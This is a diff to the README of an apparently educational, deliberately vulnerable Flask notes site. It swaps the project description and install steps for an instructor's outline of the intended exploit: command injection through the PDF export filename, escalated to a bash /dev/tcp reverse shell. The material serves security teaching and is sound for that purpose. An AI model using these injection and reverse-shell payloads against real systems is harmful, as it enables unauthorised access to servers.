@@ -1,30 +1,17 @@
-# MySecretNotes
-## Sql-injectable flask site
-This flask site is a webservice mimmicking a secure note taking software site. You can register a user and write 
-notes, your notes are "hidden" and can only be seen by you. You can share your notes and import other users notes 
-from the public note id. This site is all fine and dandy on the surface, but it is heavily sql injectable. See 
-if you can find all the injection points. I can promise you that you are able to: 
-* bypass login 
-* Steal other users passwords 
-* Steal other users notes 
-* Write notes on behalf of other users 
-* and much more...
-### Installation
-You will need python 3 and flask. To install do: 
-```sh 
-$ scp -r MySecretNotes stud@studXX.itu.dk:~
-$ ssh studXX.itu.dk -l stud
-$ sudo apt-get install python3-flask 
-$ cd MySecretNotes
-$ python3 app.py 
-``` 
+Root acces: the idea is that they spawn a reverse shell through export
+https://gtfobins.org/gtfobins/bash/#reverse-shell
 
-The project should run on port 5000 
-### Credits
-Emil Hørning for the code. 
+The attacker should realize that there is a pdf export feature to export all the notes of a user.
+After a bit of experimenting they should figure out that the filename allows for command injection by for example sending:
+```py
+l           # just gives you a pdf named l
+l; sleep 5  # gives you a pdf named l after 5 seconds of sleep
+```
+Now they should try to establish a reverse shell to the server using the approach outlined in https://gtfobins.org/gtfobins/bash/#reverse-shell
+First they should name sure to have netcat or similiar listening on some port and then give this to the export:
+```py
+l; bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'
+```
+This will give them a reverse shell and access to the user the webserver is running as.
 
-Alessandro Bruni for some flask specific functions.
-
-This site for the template: https://onepagelove.com/aria
-
-Emil Kristoffersen for styling notes.html and note.html
+TODO: How to escalate?
